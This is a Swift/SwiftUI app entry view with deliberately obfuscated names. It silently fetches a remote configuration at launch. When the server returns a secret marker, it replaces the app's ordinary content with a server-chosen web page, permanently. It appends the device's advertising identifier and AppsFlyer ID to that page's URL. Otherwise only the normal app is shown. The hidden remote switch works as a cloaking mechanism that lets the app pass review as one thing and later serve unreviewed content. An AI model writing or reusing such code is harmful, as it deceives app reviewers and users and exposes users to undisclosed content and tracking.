import SwiftUI
import AdSupport
import AppTrackingTransparency
import AppsFlyerLib

enum kxt34b2q: Int, CaseIterable {
    case none = 0
    case z06fj5cz = 1
    case nt21zn4r = 2
}

struct e5a0hpia: View {
    @State private var ra7wu2y8: URL? = UserDefaults.standard.url(forKey: "qvjknqe")
    @State private var isLoading: Bool = true
    @State private var y7alxugj: String = ""
    @State private var z1vih1ya: String = ""
    @State private var czow6i3i: Bool = false
    @State private var gtmalcj9: String? = nil
    @State private var ozux49zo: kxt34b2q = UserDefaults.standard.object(forKey: "saguhanjke") != nil ? kxt34b2q(rawValue: UserDefaults.standard.integer(forKey: "saguhanjke")) ?? .none : .none

    var body: some View {
        Group {
            if let url = ra7wu2y8 {
                lugeoo7r(url: url, ozux49zo: ozux49zo) { wa229voe in
                   
                    if UserDefaults.standard.url(forKey: "qvjknqe") == nil {
                        UserDefaults.standard.set(wa229voe, forKey: "qvjknqe")
                    }
                }
            } else if !czow6i3i {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    Image(xmr3lxtc)
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: krk4wo3k, height: krk4wo3k)
                        .cornerRadius(jqb1pkox)
                }
            } else if isLoading {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    Image(xmr3lxtc)
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: krk4wo3k, height: krk4wo3k)
                        .cornerRadius(jqb1pkox)
                }
            } else {
                ContentView()
                    .preferredColorScheme(.light)
            }
        }
        .onAppear {
            if ra7wu2y8 == nil {
               
                DispatchQueue.main.asyncAfter(deadline: .now() + mbjq2m0w) {
                    rdh4r9nf()
                }
            }
            
            
        }
    }

    private func rdh4r9nf() {
        
        let status = ATTrackingManager.trackingAuthorizationStatus
        
        switch status {
        case .authorized:
            y7alxugj = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        default:
            y7alxugj = "00000000-0000-0000-0000-000000000000"
        }
        
        z1vih1ya = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
        czow6i3i = true

        AppsFlyerManager.shared.e6ao96fo { params in
            gtmalcj9 = params
            k1z1rlbs()
            lf4szk9h = true
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + sdc6x270) {
            if !lf4szk9h {
                k1z1rlbs()
            }
        }
    }

    private func k1z1rlbs() {
        guard let url = URL(string: qm56x5to) else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            return
        }
        
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10.0
        config.timeoutIntervalForResource = 15.0
        
        let session = URLSession(configuration: config)
        
        let k4fym8nu = DispatchWorkItem {
            DispatchQueue.main.async {
                if self.isLoading {
                    print("Timeout: k1z1rlbs took too long")
                    self.isLoading = false
                }
            }
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 20, execute: k4fym8nu)
        
        session.dataTask(with: url) { data, response, error in
            DispatchQueue.main.async {
                k4fym8nu.cancel()
                
                defer { self.isLoading = false }
                
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    guard 200...299 ~= httpResponse.statusCode else {
                        print("HTTP error: \(httpResponse.statusCode)")
                        return
                    }
                }
                
                guard let data = data,
                      let text = String(data: data, encoding: .utf8) else {
                    print("Invalid data received")
                    return
                }
                
                if text.contains(fvap64r9) {
                    var yqascd2r: kxt34b2q = .none
                    
                    if text.contains("|enabled=1") {
                        yqascd2r = .z06fj5cz
                    } else if text.contains("|enabled=2") {
                        yqascd2r = .nt21zn4r
                    }
                    
                    var kdwdek5j = text
                    kdwdek5j = kdwdek5j.replacingOccurrences(of: "|enabled=1", with: "")
                    kdwdek5j = kdwdek5j.replacingOccurrences(of: "|enabled=2", with: "")
                    
                    var wa229voe = kdwdek5j + "?idfa=\(self.y7alxugj)&gaid=\(self.z1vih1ya)"
                    if let params = self.gtmalcj9 {
                        wa229voe += params
                    }
                    
                    if let url = URL(string: wa229voe) {
                        self.ozux49zo = yqascd2r
                        self.ra7wu2y8 = url
                        
                        UserDefaults.standard.set(yqascd2r.rawValue, forKey: "saguhanjke")
                    } else {
                        print("Failed to create URL from: \(wa229voe)")
                    }
                } else {
                    print("Response doesn't contain required code")
                }
            }
        }.resume()
    }
}
